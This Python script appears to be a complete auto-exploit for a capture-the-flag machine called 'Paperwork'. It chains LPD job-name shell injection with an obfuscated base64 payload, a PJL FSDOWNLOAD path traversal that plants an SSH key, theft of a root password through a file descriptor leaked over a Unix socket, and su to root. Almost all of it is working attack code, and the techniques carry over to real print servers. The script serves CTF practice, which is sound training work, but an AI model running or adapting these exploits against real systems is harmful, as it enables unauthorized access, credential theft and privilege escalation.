#!/usr/bin/env python3
"""
Paperwork (HTB) — full auto exploit chain: unauth -> user + root flags.

Chain:
  1. LPD (1515) job-name shell injection [runs as lp]. The injected command talks to
     the local PJL printer emulator (127.0.0.1:9100, runs as archivist) and uses a
     FSDOWNLOAD path-traversal to overwrite /home/archivist/.ssh/authorized_keys
     with our freshly generated public key.
  2. SSH in as archivist with that key  -> read user.txt.
  3. As archivist, connect to the root daemon socket /run/paperwork/mgmt.sock. When
     the printer log contains an "FSUPLOAD/FSDOWNLOAD/FSQUERY" trigger, the daemon
     leaks a root-opened fd for /etc/paperwork/admin_pins.conf over SCM_RIGHTS.
     os.pread() that fd -> ADMIN_PASSWORD.
  4. su root with that password (reuse) -> read root.txt.

Usage:  python3 pwn_paperwork.py [TARGET_IP]
"""
import socket, subprocess, base64, os, tempfile, sys, time

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "10.129.45.56"
LPD_PORT = 1515
SSH_USER = "archivist"

def info(m): print(f"\033[94m[*]\033[0m {m}")
def ok(m):   print(f"\033[92m[+]\033[0m {m}")
def err(m):  print(f"\033[91m[-]\033[0m {m}")

# ---------------------------------------------------------------- helpers
def wait(sec):
    # sleep() replacement that also works where time.sleep is fine
    time.sleep(sec)

def ssh(key, command, timeout=25):
    """Run a command over SSH as archivist, return (rc, stdout+stderr)."""
    cmd = [
        "ssh", "-i", key,
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR",
        f"{SSH_USER}@{TARGET}", command,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout + p.stderr)

def ssh_stdin(key, remote_python, stdin_data, timeout=25):
    """Pipe a script to `python3 -` on the remote host as archivist."""
    cmd = [
        "ssh", "-i", key,
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR",
        f"{SSH_USER}@{TARGET}", remote_python,
    ]
    p = subprocess.run(cmd, input=stdin_data, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout + p.stderr)

# ---------------------------------------------------------------- stage 1
def lpd_inject(shell_cmd):
    """Send the LPD control-file with a shell-injected job name."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((TARGET, LPD_PORT))
    s.send(b"\x02\n")                                   # receive-job, empty queue
    job_line = f"Jx';{shell_cmd};#"                     # break out of echo '...'
    control  = f"H attacker\nP user\n{job_line}\n".encode()
    header   = bytes([0x02]) + f"{len(control)} cfA001attacker\n".encode()
    s.send(header)
    try: s.recv(1)
    except Exception: pass
    s.send(control)
    try: s.recv(2)
    except Exception: pass
    s.close()

def build_pjl_writer(pub_bytes):
    """Python payload (runs as lp) that writes our key via PJL FSDOWNLOAD to 9100."""
    pub_b64 = base64.b64encode(pub_bytes).decode()
    payload = (
        "import socket,base64\n"
        "pub=base64.b64decode('" + pub_b64 + "')\n"
        "body=b'@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\\r\\n'%len(pub)+pub\n"
        "s=socket.socket();s.settimeout(5);s.connect(('127.0.0.1',9100))\n"
        "s.send(b'\\x1b%-12345X'+body+b'\\x1b%-12345X\\r\\n')\n"
        "try:\n s.recv(200)\nexcept Exception:pass\n"
        "s.close()\n"
    )
    return "echo " + base64.b64encode(payload.encode()).decode() + "|base64 -d|python3"

# ---------------------------------------------------------------- stage 3 (embedded)
SCM_EXPLOIT = r'''
import socket, array, os
LOG="/home/archivist/printer/logs/commands.log"
SOCK="/run/paperwork/mgmt.sock"
try:
    with open(LOG,"a") as f: f.write("FSUPLOAD trigger-lockdown\n")
except Exception: pass
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK)
fds=array.array("i")
msg,anc,flags,addr=s.recvmsg(4096, socket.CMSG_SPACE(2*fds.itemsize))
for level,ctype,cdata in anc:
    if level==socket.SOL_SOCKET and ctype==socket.SCM_RIGHTS:
        cdata=cdata[:len(cdata)-(len(cdata)%fds.itemsize)]
        fds.frombytes(cdata)
for fd in fds:
    try:
        data=os.pread(fd,4096,0).decode(errors="ignore")
        if "ADMIN_PASSWORD=" in data:
            print(data.split("ADMIN_PASSWORD=")[1].split("\n")[0].strip())
    except Exception: pass
s.close()
'''

# ---------------------------------------------------------------- main
def main():
    print(f"\n=== Paperwork auto-pwn  ->  {TARGET} ===\n")
    keydir = tempfile.mkdtemp(prefix="paperwork_")
    key = os.path.join(keydir, "id_ed25519")
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"], check=True)
    pub = open(key + ".pub", "rb").read().strip() + b"\n"
    ok(f"ephemeral SSH key generated: {key}")

    info("Stage 1/4: LPD (1515) injection -> PJL FSDOWNLOAD writes archivist authorized_keys")
    lpd_inject(build_pjl_writer(pub))

    # Stage 2: wait for the key to land, then SSH as archivist (retry a few times)
    info("Stage 2/4: SSH as archivist + read user.txt")
    user_flag = None
    for attempt in range(8):
        wait(2)
        rc, out = ssh(key, "id; cat /home/archivist/user.txt")
        if "uid=1000" in out:
            for line in out.splitlines():
                line = line.strip()
                if len(line) == 32 and all(c in "0123456789abcdef" for c in line):
                    user_flag = line
            ok(f"archivist shell obtained (attempt {attempt+1})")
            break
    else:
        err("could not SSH as archivist — is the printer daemon (9100) up? aborting.")
        return

    if user_flag:
        ok(f"USER FLAG: {user_flag}")
    else:
        err("logged in but user.txt not found")

    # Stage 3: leak admin password via the root daemon's SCM_RIGHTS fd
    info("Stage 3/4: leak ADMIN_PASSWORD via paperwork-daemon SCM_RIGHTS fd-passing")
    admin_pw = None
    for attempt in range(5):
        rc, out = ssh_stdin(key, "python3 -", SCM_EXPLOIT)
        for line in out.splitlines():
            line = line.strip()
            if line and " " not in line and "=" not in line and len(line) >= 6 and "uid=" not in line:
                admin_pw = line
        if admin_pw:
            break
        wait(2)
    if not admin_pw:
        err("failed to leak admin password; raw output:\n" + out)
        return
    ok(f"ADMIN_PASSWORD leaked: {admin_pw}")

    # Stage 4: su root (password reuse) -> root.txt
    info("Stage 4/4: su root (password reuse) -> read root.txt")
    su_cmd = f"echo {admin_pw} | su -c 'id; cat /root/root.txt' root"
    rc, out = ssh(key, su_cmd)
    root_flag = None
    if "uid=0" in out:
        for line in out.splitlines():
            line = line.strip()
            if len(line) == 32 and all(c in "0123456789abcdef" for c in line):
                root_flag = line
    if root_flag:
        ok(f"ROOT FLAG: {root_flag}")
    else:
        err("su as root failed; raw output:\n" + out)

    print("\n================= LOOT =================")
    print(f"  user.txt : {user_flag or 'N/A'}")
    print(f"  root.txt : {root_flag or 'N/A'}")
    print(f"  admin_pw : {admin_pw or 'N/A'}")
    print(f"  ssh key  : {key}  (archivist@{TARGET})")
    print("=======================================\n")

if __name__ == "__main__":
    main()
